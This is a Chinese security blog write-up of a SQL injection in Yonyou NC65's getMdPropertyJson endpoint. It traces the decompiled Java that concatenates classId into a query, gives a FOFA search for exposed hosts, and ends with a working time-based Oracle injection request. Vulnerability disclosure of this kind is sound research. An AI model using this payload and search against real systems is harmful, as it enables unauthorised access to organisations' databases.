---
title: "用友NC oauidesigner/getMdPropertyJson sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oauidesigner-getMdPropertyJson-classId-sqli.html
asset_dir: assets/用友nc-oauidesignergetmdpropertyjson-sql注入漏洞
---

# 用友NC oauidesigner/getMdPropertyJson sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/14 08:12
* 1202浏览
* [0评论](#comment)
* 59分钟阅读

深入探索

SQL

sql

服务器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用 /portal/pt/oauidesigner/getMdPropertyJson 接口中的 classId 参数实现sql注入，从而窃取服务器的敏感信息。

编程

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

深入探索

安全工具开发

技术文章订阅

文本剥离工具

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知SQL注入点在 getMdPropertyJson 接口

[![用友NC oauidesigner/getMdPropertyJson sql注入漏洞](images/img-001-e6880dcea571.webp)](https://image.mrxn.net/78060e5297ce483b8985335d7604203d.webp)

因此搜索 getMdPropertyJson 方法的实现部分即可定位文件

代码安全审计

nc/bs/oa/oaff/uidesigner/action/TemplatedesignerAction.class

```
package nc.bs.oa.oaff.uidesigner.action;

import java.net.URLDecoder;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CopyOnWriteArrayList;
import nc.bs.framework.common.NCLocator;
import nc.bs.oa.oaff.uidesigner.utils.CommonMethodUtil;
import nc.bs.oa.oaff.uidesigner.utils.FreemarkerUtil;
import nc.bs.oa.oaff.uidesigner.utils.JsonUtil;
import nc.bs.oa.oaff.uidesigner.utils.UICompConfigCacheHelper;
import nc.bs.oa.oaff.utils.mdUtil;
import nc.itf.oa.oaff.oafreeform.manage.IEnumMdManageService;
import nc.itf.oa.oaff.oafreeform.manage.IFormMdManageService;
import nc.itf.oa.oaff.oafreeform.manage.IFormtemplateManageService;
import nc.itf.oa.oaff.oafreeform.query.ICustomCompQueryService;
import nc.itf.oa.oaff.oafreeform.query.ICustomWidgetQueryService;
import nc.itf.oa.oaff.oafreeform.query.IEnumMdQueryService;
import nc.itf.oa.oaff.oafreeform.query.IFormMdQueryService;
import nc.itf.oa.oaff.oafreeform.query.IFormtemplateQueryService;
import nc.itf.oa.oaff.oafreeform.query.IFreeformQueryService;
import nc.uap.cpb.org.exception.CpbBusinessException;
import nc.uap.lfw.core.exception.LfwBusinessException;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.core.log.LfwLogger;
import nc.uap.lfw.file.FileManager;
import nc.uap.lfw.file.vo.LfwFileVO;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.portal.log.PortalLogger;
import nc.vo.oa.oaff.customcomp.CustomCompVO;
import nc.vo.oa.oaff.oacomp.UICompConfig;
import nc.vo.oa.oaff.oatemplate.EnumMdVO;
import nc.vo.oaff.customwidget.CustomWidgetVO;
import nc.vo.oaff.oaformtemplate.OaFormTemplateVO;
import nc.vo.oaff.oafreeformcategory.OaFreeformVO;
import nc.vo.oaff.oafreeformmd.OaFreeformMdVO;
import nc.vo.pub.BusinessException;
import nc.vo.pub.lang.UFDateTime;
import org.apache.commons.lang.StringUtils;
import uap.lfw.dbl.cpdoc.itf.ICpCommomObjectQry;
import uap.lfw.dbl.cpdoc.itf.ICpDocSysAttrQry;
import uap.lfw.dbl.vo.CpDocAttributeVO;
import uap.lfw.dbl.vo.CpDocVO;
import uap.lfw.md.dao.IPropertyVOQuery;
import uap.lfw.md.vo.PropertyVO;
import uap.wap.bd.file.CPFileLockHelper;
import uap.wap.bd.file.CpFileLockVO;
import ufida.fasterxml.jackson.databind.ObjectMapper;

@Servlet(
    path = "/oauidesigner"
)

@Action
public void getMdPropertyJson() throws BusinessException {
    try {
        String mdIdStr = this.getRequest().getParameter("mdIdMap");
        String classId = this.getRequest().getParameter("classId");
        ObjectMapper maper = new ObjectMapper();
        HashMap<String, Integer> mdIdMap = (HashMap)maper.readValue(mdIdStr, HashMap.class);
        mdUtil.setMdIdMap(mdIdMap);
        IPropertyVOQuery propertyVOQuery = (IPropertyVOQuery)NCLocator.getInstance().lookup(IPropertyVOQuery.class);
        PropertyVO[] vos = new PropertyVO[0];

        try {
            vos = propertyVOQuery.getPropertyVOByCondition("classid='" + classId + "' order by ATTRSEQUENCE ");
        } catch (CpbBusinessException e) {
            LfwLogger.error(e.getMessage(), e.getCause());
            throw new LfwRuntimeException(e.getMessage());
        }
```

classId 参数直接拼接在SQL语句后，代入 getPropertyVOByCondition 函数，其实现逻辑如下

漏洞扫描服务

```
public PropertyVO[] getPropertyVOByCondition(String condition) throws CpbBusinessException {
    PropertyVO[] propertyvos = null;

    try {
        propertyvos = (PropertyVO[])(new PtBaseDAO()).queryByCondition(PropertyVO.class, condition);
        return propertyvos;
    } catch (DAOException e) {
        CpLogger.error(e.getMessage(), e);
        throw new CpbBusinessException(e.getMessage());
    }
}
```

继续代入 queryByCondition 函数，其实现逻辑如下

```
public SuperVO[] queryByCondition(Class voClass, String strWhere) throws DAOException {
    if (strWhere != null && strWhere.length() != 0) {
        strWhere = " (isnull(dr,0)=0) and " + strWhere;
    } else {
        strWhere = " (isnull(dr,0)=0) ";
    }

    PersistenceManager manager = null;

    SuperVO[] var5;
    try {
        manager = this.createPersistenceManager(this.dataSource);
        List list = (List)manager.retrieveByClause(voClass, strWhere);
        var5 = (SuperVO[])list.toArray((SuperVO[])Array.newInstance(voClass, 0));
    } catch (DbException e) {
        Logger.error(e.getMessage(), e);
        throw new DAOException(e.getMessage());
    } finally {
        if (manager != null) {
            manager.release();
        }

    }

    return var5;
}
```

strWhere 直接拼接到 and SQL语句后 代入 retrieveByClause 函数

计算机服务器

继续跟踪 retrieveByClause 函数

```
public Collection retrieveByClause(Class className, String condition) throws DbException {
    return this.retrieveByClause(className, (String)condition, (String[])null);
}

public Collection retrieveByClause(Class className, String condition, String[] fields, SQLParameter parameters) throws DbException {
    BaseProcessor processor = new BeanListProcessor(className);
    return (Collection)this.session.executeQuery(this.buildSql(className, condition, fields), parameters, processor);
}

public Collection retrieveByClause(Class className, String condition, String[] fields) throws DbException {
    return this.retrieveByClause(className, (String)condition, (String[])fields, (SQLParameter)null);
}
```

最终 classId 参数拼接进SQL语句后由 buildSql 函数组装成SQL语句，最终调用 executeQuery 执行上面组合后的SQL语句，造成SQL注入漏洞。

SQL注入防护

[![用友NC oauidesigner/getMdPropertyJson sql注入漏洞](images/img-002-d2e23dde263e.webp)](https://image.mrxn.net/f4be200a552149d494d5a66135c58c17.webp)

# 漏洞复现

> 只是示例
>
> 编程

```
GET /portal/pt/oauidesigner/getMdPropertyJson?pageId=login&mdIdMap=1&classId=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',4)-- HTTP/1.1
Host: nc65.mrxn.net
```

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=667`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC oauidesigner/getMdPropertyJson sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-oauidesigner-getMdPropertyJson-classId-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-oauidesigner-getMdPropertyJson-classId-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oauidesigner-getMdPropertyJson-classId-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALS0lEQVR4Aeyb7XbbOAxEc/f937kbZHplESJtOW1q/1BO2dF8AKIJuVv7bP/7+Pj49Z31q/3Yo8lL2vOd98Lud77P63XcZ/bX5vZaXa/08var5+TfwRrIZ931611OYBvI58Q/zqzVxq3VBz7gtrq+4l2H9LA/zDlEB7bXYa9eqw6pkYsQvddBdBjRuo7WP8J93TaQvXhdv+4EDgOBcfoQfnaLkHx/Knp99+Uw1q/quv4Mh/k9ILq9YOTq7lX+CCF9YMRZ3WEgs9Cl/bsT+GsDgUy/bx2iQ7A/XRAdgtbDc9y6QhhrS9uvvgc9dVH9ET6bv9fvrw3k3k0u7/wJ/PFAIE+jT4kIo963BPd9+3SE1PV+M25t9yA9IGgOwnt+xa1b+d/R/3gg37npVbM+gcNAnHrHVQtz+sAHn0sd5k+dvnWdw1gHIzc/Q3t2nGVLg7G3deXNFszz1nWc9Sit54ofBlLitV53AttAIFOH+9i3Csl3vfN6ImrBmIeRW1fZWhC/rmvpixAfUDog8PWtgQaMXL3614LRh5GbF2HuQ3S4j/Yp3AZS5FqvP4H/6on4zupbhzwF6hBub3UR5r55iN/zctF8oVrH8mrB2NNcebU6h+TLqwXh5sTyanVe2rPreod4im+Ch4FAngII9n1CdAh2v3NIDoL9iVnlu945pB8c0SyMnvpZdK89rw7prw/hEOy6/B4eBnIvfHk/fwKHgTh9EcZpq/etdV0umoexH4RDsOflK7RvYc+UVku9rmvJIfcs7d6Cec4+q1pInTkIX+VLPwykxGu97gSWA4FxmhAOQacuQnRfCoxcvefl+jDWQTjw9VkCRm7dHiGZ3nufqeuVD6mvzH6Zh/gw4j47u+71s8xyILPwpf38CfwHmXK/ldNc6TCvM7+qh9Tpw8itF83JRfU96nWE3OOs3nNnuXvpecj9IXjPv94h/XRezLdP6pDpQXC1L4jv0wDhq3zXres6zPvAqPd6iA837L3lvVYdUis3B6Ou/witX6H1kP773PUO8XTeBLeB7KdU15Dp9X2WV0u9rmt1DqmHoD6MXL16nFkw1u9rei8Ys/ow6vaAUTevLxfVRXURxn4w8p4DPraBfFw/b3EC20BgnJ5TF90tjDm4z63rfdRFmPeBUbcPRIcb2utvI9zuASzbA8NnpWXwt+Fr2eM2kN+ZC158AtvnEKcEmbL7gnB9UX/